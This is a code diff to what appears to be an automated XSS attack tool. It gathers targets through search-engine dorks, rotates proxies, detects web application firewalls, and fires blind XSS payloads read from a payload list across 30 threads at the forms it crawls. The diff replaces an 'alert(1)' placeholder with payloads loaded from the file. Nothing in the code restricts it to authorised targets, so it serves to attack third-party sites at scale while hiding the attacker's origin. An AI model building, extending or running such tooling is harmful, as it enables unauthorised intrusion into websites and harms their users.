@@ -14,7 +14,11 @@ from tqdm import tqdm
 
 from attacks.dorks.search_engine_dorking import get_proxies_and_cycle
 from attacks.xss.xss_striker import attacker_crawler
-from reporting.results_manager import get_crawling_results, update_attack_result
+from reporting.results_manager import (
+    get_crawling_results,
+    get_xss_links,
+    update_attack_result,
+)
 from vpn_proxies.proxies_manager import prepare_proxies
 from bypasser.waf_mitigation import waf_detector
 from utils.app_config import (
@@ -54,7 +58,6 @@ def test_xss_target(url, proxy, config, dork_id, link_id, attack_id):
         "Accept-Language": "en-US,en;q=0.5",
         "Accept-Encoding": "gzip,deflate",
         "Connection": "close",
-        "accept-language": "en-US,en;q=0.9",
         "cache-control": "max-age=0",
         "DNT": "1",
         "Upgrade-Insecure-Requests": "1",
@@ -155,18 +158,36 @@ def test_xss_target(url, proxy, config, dork_id, link_id, attack_id):
     #     time.sleep(delay)  # Wait before retrying
 
 
-def launch_xss_attack(config, website_to_test):
+def launch_xss_attack(config):
     """
     Test a list of websites for XSS vulnerability using multithreading and proxies.
     """
+    website_to_test = get_xss_links(config)
+    cprint(
+        "\nTesting websites for XSS vulnerability...\n",
+        "blue",
+        file=sys.stderr,
+    )
+    if not website_to_test:
+        cprint(
+            "No websites found matching the dorks. Please adjust your search criteria.",
+            "red",
+            file=sys.stderr,
+        )
     if len(website_to_test) > 0:
         try:
             proxies, proxy_cycle = get_proxies_and_cycle(config)
-            number_of_worker = len(proxies)
+            number_of_worker = 30  # min(len(proxies)*2, 30)
             # TODO: use blind-xss-payload-list.txt
             # configure a domain for the attacks
 
             website = get_crawling_results(config)
+
+            cprint(
+                f"Creating {len(website)} targets for XSS",
+                color="yellow",
+                file=sys.stderr,
+            )
 
             search_tasks_with_proxy = []
             for website, domUrls, forms in website:
@@ -174,7 +195,7 @@ def launch_xss_attack(config, website_to_test):
                 scheme = urlparse(website).scheme
                 host = urlparse(website).netloc
                 main_url = scheme + "://" + host
-                for form, domURL in zip(forms, domUrls):
+                for form, domURL in list(zip(forms, domUrls)):
                     search_tasks_with_proxy.append(
                         {
                             "main_url": main_url,
@@ -189,7 +210,9 @@ def launch_xss_attack(config, website_to_test):
             if config["fuzz_xss"]:
                 raise NotImplementedError("Fuzzing is not implemented yet")
             else:
-                blindPayloads = "alert(1)"  # TODO read from file
+                blindPayloads = []
+                with open("attacks/xss/payloads/blind-xss-payload-list.txt", "r") as f:
+                    blindPayloads = f.readlines()
                 encoding = base64 if config["encode_xss"] else False
                 with concurrent.futures.ThreadPoolExecutor(
                     max_workers=number_of_worker
@@ -282,7 +305,7 @@ def launch_xss_attack(config, website_to_test):
                 file=sys.stderr,
             )
             exit(1)
-        except Exception as e:
-            cprint(f"Error: {e}", color="red", file=sys.stderr)
+        # except Exception as e:
+        #     cprint(f"Error: {e}", color="red", file=sys.stderr)
     else:
         cprint("No Potential XSS", color="red", file=sys.stderr)
